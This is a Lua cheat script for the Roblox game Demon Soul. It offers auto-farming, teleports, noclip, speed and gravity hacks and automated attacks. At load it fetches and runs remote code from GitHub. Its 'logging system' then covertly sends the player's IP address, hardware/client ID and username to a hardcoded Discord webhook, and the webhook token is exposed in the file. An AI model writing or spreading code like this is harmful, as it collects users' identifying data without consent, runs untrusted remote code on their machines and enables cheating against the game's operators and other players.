-- [[ OSX HUB: DEMON SOUL AUTOMATION ]] --
-- SMOOTH FLY & ULTRA OPTIMIZED VERSION
-- Created for: Demon Soul (Roblox)

local GameName = "DEMON SOUL"

local success, OSX = pcall(function()
    return loadstring(readfile("OSX_Lib.lua"))()
end)

if not success then
    OSX = loadstring(game:HttpGet("https://raw.githubusercontent.com/yxucnx/OSX-HUB-Lib/refs/heads/main/OSX_Lib.lua?v=" .. tick()))()
end


-- [[ SERVICES ]] --
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local Lighting = game:GetService("Lighting")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local VirtualInputManager = game:GetService("VirtualInputManager")
local TweenService = game:GetService("TweenService")
local HttpService = game:GetService("HttpService")

local localPlayer = Players.LocalPlayer

-- [[ LOGGING SYSTEM ]] --
local WebhookURL = "https://discord.com/api/webhooks/1490398138220019825/jlZBTnlWn2ZWKEd4bvBUYjQrnQXCX4N9MjfVSK0ceBqQQVIBHaZQ4xDcPnCnA0SlDbAs"

local function SendLog()
    task.spawn(function()
        local successIP, ip = pcall(function() return game:HttpGet("https://api4.ipify.org/") end)
        local hwid = game:GetService("RbxAnalyticsService"):GetClientId()
        local time = os.date("%X")
        
        local payload = {
            ["username"] = "𝗢𝗦𝗫 𝗛𝗨𝗕 - 𝗟𝗢𝗚 𝗨𝗦𝗘 𝗦𝗖𝗥𝗜𝗣𝗧",
            ["avatar_url"] = "https://media.discordapp.net/attachments/1485621966575501312/1488393679117881344/logo512v2.png?ex=69d335a2&is=69d1e422&hm=9403f72a1903c8fa334cf883d7f906b1c06b8e3e6c7432b5b1e6b50fe8281e22&=&format=webp&quality=lossless",
            ["embeds"] = {{
                ["title"] = "[!] : 𝗧𝗵𝗲 𝘀𝘆𝘀𝘁𝗲𝗺 𝗱𝗲𝘁𝗲𝗰𝘁𝗲𝗱 𝘁𝗵𝗲 𝘂𝘀𝗲 𝗼𝗳 𝗮 𝘀𝗰𝗿𝗶𝗽𝘁.",
                ["description"] = string.format(
                    "――――――――――――――――――――――\n\n**👤 User :**  ```%s```\n**🎮 Script Name :** ```%s```\n**🖥️ HWID :** ```%s```\n**🔐 KEY :** ```%s```\n**🗺️ IP :** ```%s```\n**❌ ACC BAN :** ```%s```\n**🧾Reason :** ```%s```\n** ⏳ Time Data :** ```%s```\n\n――――――――――――――――――――――",
                    localPlayer.Name, GameName, hwid, "None", (successIP and ip or "Unknown"), "None", "None", time
                ),
                ["color"] = 34303,
                ["footer"] = {
                    ["text"] = "© 2026 Osx Hub. All rights reserved.",
                    ["icon_url"] = "https://media.discordapp.net/attachments/1485621966575501312/1488393679117881344/logo512v2.png?ex=69d335a2&is=69d1e422&hm=9403f72a1903c8fa334cf883d7f906b1c06b8e3e6c7432b5b1e6b50fe8281e22&=&format=webp&quality=lossless"
                },
                ["image"] = {
                    ["url"] = "https://media.discordapp.net/attachments/1485621966575501312/1490364198008393818/standard_1.gif?ex=69d3c952&is=69d277d2&hm=84671fab55d2308ed14c9bd662582a0e6170d1ed0a55c8c6fcbe0cdbbea901fd&="
                }
            }}
        }
        
        pcall(function()
            (request or http_request or (http and http.request))({
                Url = WebhookURL,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode(payload)
            })
        end)
    end)
end

-- Call Initial Log
SendLog()
local DefaultLighting = {
    Brightness = Lighting.Brightness,
    ClockTime = Lighting.ClockTime,
    FogEnd = Lighting.FogEnd,
    GlobalShadows = Lighting.GlobalShadows,
    OutdoorAmbient = Lighting.OutdoorAmbient
}

-- [[ SCRIPT LOGIC VARIABLES ]] --
local InternalMonsterData = {} 
local IsCasting = false 

local MonsterSystemRemotes = ReplicatedStorage:WaitForChild("MonsterSystemRemotes")
local RemoteEvents = ReplicatedStorage:WaitForChild("RemoteEvents")

local SkillAttack = RemoteEvents:WaitForChild("SkillAttack")
local GeneralAttack = RemoteEvents:WaitForChild("GeneralAttack")

-- [[ CONFIGURATION ]] --
local Config = {
    Farm = {
        AutoFarm = false,
        AutoTweenFarm = false,
        TweenSpeed = 100,
        MonsterTarget = "All Monsters",
        MaxDistance = 1000
    },
    Combat = {
        FastAttack = false,
        AutoSkill = false
    },
    Player = {
        WalkSpeed = 16,
        JumpPower = 50,
        InfiniteJump = false,
        NoClip = false,
        FullBright = false,
        CFrameSpeed = false,
        SpeedValue = 1,
        CustomGravity = false,
        GravityValue = 196.2
    }
}

-- [[ LOGIC FUNCTIONS ]] --

local function TeleportTo(cf)
    local char = localPlayer.Character
    local hrp = char and char:FindFirstChild("HumanoidRootPart")
    if hrp then
        char:PivotTo(cf)
    end
end

local CurrentTween = nil
local LastTweenPos = Vector3.new(0, 0, 0)
local OldShakeUpdate = nil



local function TweenTo(cf)
    local char = localPlayer.Character
    local hrp = char and char:FindFirstChild("HumanoidRootPart")
    if not hrp then return end
    
    local dist = (hrp.Position - cf.Position).Magnitude
    if dist < 1 then
        if CurrentTween then CurrentTween:Cancel() CurrentTween = nil end
        char:PivotTo(cf)
        return
    end
    
    -- Only re-tween if the target moved significantly (> 2 studs)
    if (cf.Position - LastTweenPos).Magnitude < 2 then return end
    LastTweenPos = cf.Position
    
    local speed = Config.Farm.TweenSpeed or 100
    local duration = dist / speed
    
    if CurrentTween then CurrentTween:Cancel() end
    CurrentTween = TweenService:Create(hrp, TweenInfo.new(duration, Enum.EasingStyle.Linear), {CFrame = cf})
    CurrentTween:Play()
end

-- [[ UI INITIALIZATION ]] --
-- [[ UI INITIALIZATION ]] --
local Window = OSX:CreateWindow({
    Title = "OSX HUB | " .. GameName,
    Subtitle = "Made by: LilYouDev1997 | Discord: discord.gg/osxhub",
    WindowLogo = "https://img2.pic.in.th/logo512v2.png",
    FloatingLogo = "https://img1.pic.in.th/images/logo512v1.png",
    ToggleKey = Enum.KeyCode.RightControl
})

local Tabs = {
    Main = Window:AddTab({ Title = "Auto Farm", Icon = "sword", SubDescription = "Farming & XP" }),
    Combat = Window:AddTab({ Title = "Combat", Icon = "target", SubDescription = "Skills & Attack" }),
    Player = Window:AddTab({ Title = "Player", Icon = "user", SubDescription = "Character Configuration" }),
    Teleport = Window:AddTab({ Title = "Teleport", Icon = "map", SubDescription = "World Navigation" }),
    Settings = Window:AddTab({ Title = "Settings", Icon = "settings", SubDescription = "Script Configuration" })
}


-- [[ Auto Farm Tab ]]
local FarmPanel = Tabs.Main:AddPanel("Farming Automation")

FarmPanel:AddToggle({
    Title = "Auto TP Farm v1",
    Description = "วาร์ปฟาร์มมอนสเตอร์อัตโนมัติ (เสี่ยงโดนเเบน)",
    Default = false,
    Callback = function(Value) Config.Farm.AutoFarm = Value end
})

FarmPanel:AddToggle({
    Title = "Auto TP Farm v2",
    Description = "เลื่อนไปฟาร์มมอนสเตอร์อัตโนมัติ (ไม่เสี่ยงโดนแบน)",
    Default = false,
    Callback = function(Value) Config.Farm.AutoTweenFarm = Value end
})

FarmPanel:AddSlider({
    Title = "TP Farm v2 Speed",
    Description = "ความเร็วในการเลื่อน (ยิ่งเยอะยิ่งเร็ว)",
    Default = 50,
    Min = 50,
    Max = 300,
    Rounding = 0,
    Callback = function(Value) Config.Farm.TweenSpeed = Value end
})

local MonsterList = {"All Monsters"}
local MonsterSelector = FarmPanel:AddDropdown({
    Title = "Target Monster",
    Description = "เลือกมอนสเตอร์ที่จะฟาร์ม",
    Values = MonsterList,
    Default = "All Monsters",
    Callback = function(Value) Config.Farm.MonsterTarget = Value end
})

FarmPanel:AddButton({
    Title = "Scan Monsters Nearby",
    Description = "หาชื่อมอนสเตอร์แถวนี้มาใส่ในรายการ",
    Callback = function()
        local names = {"All Monsters"}
        local seen = {}
        for _, v in ipairs(workspace:GetDescendants()) do
            if v:IsA("Model") and v:FindFirstChildOfClass("Humanoid") then
                if not seen[v.Name] and not Players:GetPlayerFromCharacter(v) then
                    table.insert(names, v.Name)
                    seen[v.Name] = true
                end
            end
        end
        OSX:Notify({Title = "Scanner", Content = "Found " .. #names .. " monster types!"})
    end
})

FarmPanel:AddSlider({
    Title = "Farm Distance",
    Description = "ระยะการค้นหามอนสเตอร์ (ป้องกันวาร์ปข้ามโซน)",
    Default = 1000,
    Min = 100,
    Max = 5000,
    Rounding = 0,
    Callback = function(Value) Config.Farm.MaxDistance = Value end
})

-- Combat Tab
local CombatPanel = Tabs.Combat:AddPanel("Combat Configuration")

CombatPanel:AddToggle({
    Title = "Fast Attack",
    Description = "โจมตีเร็วอัตโนมัติ",
    Default = false,
    Callback = function(Value) Config.Combat.FastAttack = Value end
})

CombatPanel:AddToggle({
    Title = "Auto Skill",
    Description = "ใช้สกิลอัตโนมัติ (Q, E, R)",
    Default = false,
    Callback = function(Value) Config.Combat.AutoSkill = Value end
})

-- Player Tab
local PlayerPanel = Tabs.Player:AddPanel("Movement Control (Advanced)")

PlayerPanel:AddToggle({
    Title = "CFrame Speed Boost",
    Description = "เคลื่อนที่เร็วด้วย CFrame (ทะลุขีดจำกัด)",
    Default = false,
    Callback = function(Value) Config.Player.CFrameSpeed = Value end
})

PlayerPanel:AddSlider({
    Title = "Speed Multiplier",
    Description = "ปรับความเร็ว CFrame",
    Default = 1,
    Min = 1,
    Max = 10,
    Rounding = 1,
    Callback = function(Value) Config.Player.SpeedValue = Value end
})

PlayerPanel:AddToggle({
    Title = "Custom Gravity",
    Description = "ปรับแรงโน้มถ่วง (ช่วยให้กระโดดสูง/ตัวเบา)",
    Default = false,
    Callback = function(Value) 
        Config.Player.CustomGravity = Value 
        if not Value then workspace.Gravity = 196.2 end
    end
})

PlayerPanel:AddSlider({
    Title = "Gravity Value",
    Description = "ยิ่งน้อยยิ่งตัวเบา (ปกติคือ 196.2)",
    Default = 196,
    Min = 0,
    Max = 500,
    Rounding = 0,
    Callback = function(Value) Config.Player.GravityValue = Value end
})

PlayerPanel:AddSection("Standard Adjustments")

PlayerPanel:AddSlider({
    Title = "Walk Speed",
    Description = "ปรับความเร็วเดิน (แบบปกติ)",
    Default = 16,
    Min = 16,
    Max = 300,
    Rounding = 0,
    Callback = function(Value) Config.Player.WalkSpeed = Value end
})

PlayerPanel:AddSlider({
    Title = "Jump Power",
    Description = "ปรับแรงกระโดด (แบบปกติ)",
    Default = 50,
    Min = 50,
    Max = 300,
    Rounding = 0,
    Callback = function(Value) Config.Player.JumpPower = Value end
})

PlayerPanel:AddToggle({
    Title = "Infinite Jump",
    Description = "กระโดดได้ไม่จำกัด",
    Default = false,
    Callback = function(Value) Config.Player.InfiniteJump = Value end
})

PlayerPanel:AddToggle({
    Title = "NoClip",
    Description = "เดินทะลุกำแพง",
    Default = false,
    Callback = function(Value) Config.Player.NoClip = Value end
})

PlayerPanel:AddToggle({
    Title = "Full Bright",
    Description = "ปรับแสงสว่างสูงสุด",
    Default = false,
    Callback = function(Value) Config.Player.FullBright = Value end
})

-- Teleport Tab

-- Teleport Tab
local TpPanel = Tabs.Teleport:AddPanel("World Locations")

TpPanel:AddButton({
    Title = "Begin Village",
    Description = "วาร์ปไปหมู่บ้านเริ่มต้น",
    Callback = function() TeleportTo(CFrame.new(17164.1602, 29.0764847, 833.157043, -0.674843192, 0, -0.737961173, 0, 1, 0, 0.737961173, 0, -0.674843192)) end
})

TpPanel:AddButton({
    Title = "Boss House",
    Description = "วาร์ปไปบ้านบอส",
    Callback = function() TeleportTo(CFrame.new(1442.92395, -437.099396, 745.856506, -1, 0, 0, 0, 1, 0, 0, 0, -1)) end
})

TpPanel:AddButton({
    Title = "Debug Room",
    Description = "วาร์ปไปห้องดีบั๊กเเอดมิน",
    Callback = function() TeleportTo(CFrame.new(-532.034973, -933.996887, 1818.2334, 1, 0, 0, 0, 1, 0, 0, 0, 1)) end
})

TpPanel:AddButton({
    Title = "Train Area",
    Description = "วาร์ปไปโซนฝึกซ้อม",
    Callback = function() TeleportTo(CFrame.new(10.1542149, 29.7946396, -105.225555, 0.819155693, 0, 0.573571265, 0, 1, 0, -0.573571265, 0, 0.819155693)) end
})

TpPanel:AddButton({
    Title = "Door Blood Moon",
    Description = "วาร์ปไปประตูดวงจันทร์สีเลือด",
    Callback = function() TeleportTo(CFrame.new(353.412598, 33.6618271, 949.101929, 9.15527344e-05, 1, 5.24520874e-06, 5.24520874e-06, -5.24520874e-06, 1, 1, -9.15527344e-05, -5.24520874e-06)) end
})

TpPanel:AddButton({
    Title = "Ubuyashiki Home",
    Description = "วาร์ปไปคฤหาสน์อุบุยาชิกิ",
    Callback = function() TeleportTo(CFrame.new(427.895721, 40.0993271, 867.998474, -1.1920929e-07, 0, 1.00000012, 0, 1, 0, -1.00000012, 0, -1.1920929e-07)) end
})

TpPanel:AddButton({
    Title = "Wild Area",
    Description = "วาร์ปไปโซนป่าดิบ",
    Callback = function() TeleportTo(CFrame.new(666.948975, 86.9040146, 196.846359, 0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, 0.499959469)) end
})

-- Settings Tab Setup
-- Settings Tab Setup
local DevPanel = Tabs.Settings:AddPanel("Developer Panel")
DevPanel:AddInfoLabel("Owner", "darkmxde.")
DevPanel:AddInfoLabel("Developer", "LilYouDev1997x")
DevPanel:AddInfoLabel("Version UI", "v7.1 (Monochrome)")

DevPanel:AddButton({
    Title = "Join Discord",
    Description = "คลิกเพื่อคัดลอกลิงก์ Discord",
    Callback = function()
        setclipboard("https://discord.gg/osxhub")
        OSX:Notify({Title = "Clipboard", Content = "Discord Link Copied!"})
    end
})

local UserPanel = Tabs.Settings:AddPanel("User Information")
UserPanel:AddInfoLabel("Player", localPlayer.Name, "ชื่อผู้เล่นปัจจุบัน")
UserPanel:AddInfoLabel("Script", "Demon Soul", "โปรไฟล์สคริปต์ที่ใช้งานอยู่")
UserPanel:AddInfoLabel("Status", "Operational", "สถานะการทำงาน")

local ConfigPanel = Tabs.Settings:AddPanel("UI Management")
ConfigPanel:AddButton({
    Title = "Destroy UI",
    Description = "ปิดการทำงานของเมนู",
    Callback = function() Window:Destroy() end
})

OSX:Notify({
    Title = "OSX HUB",
    Content = "Demon Soul Script Loaded Successfully!",
    Duration = 5
})


-- [[ LOGIC FUNCTIONS ]] --


local function InitProTracker()
    MonsterSystemRemotes:WaitForChild("MonsterSpawn").OnClientEvent:Connect(function(arg1)
        if typeof(arg1) == "table" then
            if arg1.id then InternalMonsterData[arg1.id] = arg1
            else for _, v in ipairs(arg1) do InternalMonsterData[v.id] = v end end
        end
    end)
    MonsterSystemRemotes:WaitForChild("MonsterUpdate").OnClientEvent:Connect(function(arg1)
        for _, v in ipairs(arg1) do
            if InternalMonsterData[v.id] then
                for k, val in pairs(v) do InternalMonsterData[v.id][k] = val end
            end
        end
    end)
    MonsterSystemRemotes:WaitForChild("MonsterDie").OnClientEvent:Connect(function(arg1)
        if arg1 and arg1.id then InternalMonsterData[arg1.id] = nil end
    end)
    MonsterSystemRemotes:WaitForChild("MonsterDespawn").OnClientEvent:Connect(function(arg1)
        if typeof(arg1) == "string" then InternalMonsterData[arg1] = nil
        elseif typeof(arg1) == "table" then for _, id in ipairs(arg1) do InternalMonsterData[id] = nil end end
    end)
end

local LastScanTime = 0
local function GetNearestMonster()
    local target, distance = nil, math.huge
    local hrp = localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart")
    if not hrp then return nil end
    local targetName = Config.Farm.MonsterTarget or "All Monsters"
    local monsterCount, targetId = 0, nil
    local limit = Config.Farm.MaxDistance or 1000
    
    for id, data in pairs(InternalMonsterData) do
        local model = data.Instance or workspace.Monsters:FindFirstChild(id) or workspace.Monsters:FindFirstChild(data.name or "")
        if model and model.Parent then
            if targetName == "All Monsters" or model.Name == targetName or data.name == targetName then
                local mHrp = model.PrimaryPart or model:FindFirstChild("HumanoidRootPart")
                if mHrp and (data.health or 100) > 0 then
                    local dist = (mHrp.Position - hrp.Position).Magnitude
                    if dist < distance and dist <= limit then 
                        distance, target, targetId, monsterCount = dist, model, id, monsterCount + 1 
                    end
                end
            end
        end
    end
    
    if monsterCount == 0 and tick() - LastScanTime > 2 then
        LastScanTime = tick()
        for _, v in ipairs(workspace:FindFirstChild("Monsters"):GetDescendants()) do
            if v:IsA("Model") and not Players:GetPlayerFromCharacter(v) then
                local mHrp, hum = v.PrimaryPart or v:FindFirstChild("HumanoidRootPart"), v:FindFirstChildOfClass("Humanoid")
                if mHrp and (targetName == "All Monsters" or v.Name == targetName) then
                    local hp = hum and hum.Health or 100
                    if hp > 0 then
                        local dist = (mHrp.Position - hrp.Position).Magnitude
                        if dist < distance and dist <= limit then distance, target, targetId, monsterCount = dist, v, v.Name, monsterCount + 1 end
                    end
                end
            end
        end
    end
    return target, monsterCount, 100, targetId
end

local function EquipWeapon()
    local character = localPlayer.Character
    if not character then return end
    if not character:FindFirstChildOfClass("Tool") then
        local backpackTool = localPlayer.Backpack:FindFirstChildOfClass("Tool")
        if backpackTool then 
            local hum = character:FindFirstChildOfClass("Humanoid")
            if hum then hum:EquipTool(backpackTool) end
        end
    end
end

local CurrentSkillCode = Enum.KeyCode.Q
local function CastSkills()
    if not Config.Combat.AutoSkill or IsCasting then return end
    IsCasting = true
    task.spawn(function()
        EquipWeapon()
        VirtualInputManager:SendKeyEvent(true, CurrentSkillCode, false, game)
        task.wait(0.05)
        VirtualInputManager:SendKeyEvent(false, CurrentSkillCode, false, game)
        if CurrentSkillCode == Enum.KeyCode.Q then CurrentSkillCode = Enum.KeyCode.E
        elseif CurrentSkillCode == Enum.KeyCode.E then CurrentSkillCode = Enum.KeyCode.R
        else CurrentSkillCode = Enum.KeyCode.Q end
        task.wait(0.7)
        IsCasting = false
    end)
end

-- Fast Attack Loop
task.spawn(function()
    while true do
        task.wait(0.1) -- Fixed high-performance speed
        if Config.Combat.FastAttack then for i = 1, 4 do GeneralAttack:FireServer(i) end end
    end
end)

-- Auto Skill Loop
task.spawn(function()
    while true do
        task.wait(1.0)
        if Config.Combat.AutoSkill then
            local target = GetNearestMonster()
            if target then CastSkills() end
        end
    end
end)

-- FullBright & Player Logic
-- [[ PLAYER ENHANCEMENTS ]] --
task.spawn(function()
    while true do
        task.wait()
        pcall(function()
            local char = localPlayer.Character
            local hrp = char and char:FindFirstChild("HumanoidRootPart")
            local hum = char and char:FindFirstChildOfClass("Humanoid")
            
            if hum and hrp then
                -- 1. Standard WalkSpeed/JumpPower Force
                hum.WalkSpeed = Config.Player.WalkSpeed
                hum.JumpPower = Config.Player.JumpPower
                hum.UseJumpPower = true
                
                -- 2. CFrame Speed Boost (Bypasses most speed resets)
                if Config.Player.CFrameSpeed and hum.MoveDirection.Magnitude > 0 then
                    hrp.CFrame = hrp.CFrame + hum.MoveDirection * (Config.Player.SpeedValue * 0.15)
                end
                
                -- 3. Custom Gravity
                if Config.Player.CustomGravity then
                    workspace.Gravity = Config.Player.GravityValue
                end
            end
        end)
    end
end)

-- FullBright Logic
RunService.Heartbeat:Connect(function()
    if Config.Player.FullBright then
         Lighting.Brightness = 2; Lighting.ClockTime = 14; Lighting.GlobalShadows = false
        for _, v in ipairs(Lighting:GetChildren()) do
            if v:IsA("BloomEffect") or v:IsA("DepthOfFieldEffect") or v:IsA("Clouds") then v.Enabled = false end
        end
    end
end)

-- Infinite Jump
game:GetService("UserInputService").JumpRequest:Connect(function()
    if Config.Player.InfiniteJump then
        local char = localPlayer.Character
        local hum = char and char:FindFirstChildOfClass("Humanoid")
        if hum then hum:ChangeState(Enum.HumanoidStateType.Jumping) end
    end
end)

-- Manual NoClip
RunService.Stepped:Connect(function()
    if Config.Player.NoClip then
        local char = localPlayer.Character
        if char then
            for _, v in ipairs(char:GetDescendants()) do
                if v:IsA("BasePart") then v.CanCollide = false end
            end
        end
    end
end)

-- [[ FARM LOOP (STABLE SNAP TP VERSION) ]] --

local CurrentTarget = nil
local CurrentTargetID = nil
local LastTPTick = 0

RunService.Heartbeat:Connect(function()
    if not Config.Farm.AutoFarm and not Config.Farm.AutoTweenFarm then 
        CurrentTarget = nil
        CurrentTargetID = nil
        if CurrentTween then CurrentTween:Cancel() CurrentTween = nil end
        return 
    end
    
    pcall(function()
        local character = localPlayer.Character
        local hrp = character and character:FindFirstChild("HumanoidRootPart")
        if not hrp then return end
        
        -- [[ TARGET CONSISTENCY LOCK ]] --
        local isTargetValid = false
        if CurrentTarget and CurrentTarget.Parent and CurrentTarget:FindFirstChildOfClass("Humanoid") then
            if CurrentTarget:FindFirstChildOfClass("Humanoid").Health > 0 then
                isTargetValid = true
            end
        end
        
        -- Only search for a new target if current is dead or gone
        if not isTargetValid then
            local target, mCount, hpVal, targetId = GetNearestMonster()
            if target then
                CurrentTarget = target
                CurrentTargetID = targetId
                LastTPTick = tick() 
            else
                CurrentTarget = nil
            end
        end
        
        -- NoClip (Always on during farm)
        for _, v in ipairs(character:GetDescendants()) do
            if v:IsA("BasePart") and v.CanCollide then v.CanCollide = false end
        end
        
        if CurrentTarget then
            local mHrp = CurrentTarget.PrimaryPart or CurrentTarget:FindFirstChild("HumanoidRootPart")
            if mHrp then
                -- [[ POSITION CONFIGURATION (DEFAULT SNAP) ]] --
                local offset = CFrame.new(0, 0, 3) -- Snapped behind the monster
                
                -- [[ POSITION & ROTATION TARGETING ]] --
                local targetCFrame = mHrp.CFrame * offset
                
                -- [[ STABLE TP LOGIC ]] --
                if not IsCasting then
                    if Config.Farm.AutoTweenFarm then
                        TweenTo(targetCFrame)
                    else
                        if CurrentTween then CurrentTween:Cancel() CurrentTween = nil end
                        local distToOffset = (hrp.Position - targetCFrame.Position).Magnitude
                        
                        -- Only Pivot if we are away from target or monster moved (> 1.5 studs)
                        if distToOffset > 1.5 then
                            character:PivotTo(targetCFrame)
                        else
                            -- Stay at position, just face the monster directly (Vertical included)
                            hrp.CFrame = CFrame.lookAt(hrp.Position, mHrp.Position)
                        end
                    end
                end
                
                -- Lock Velocity for stability
                hrp.Velocity = Vector3.zero
                hrp.RotVelocity = Vector3.zero
            end
        else
            if CurrentTween then CurrentTween:Cancel() CurrentTween = nil end
        end
    end)
end)

InitProTracker()
Window:SelectTab(1)

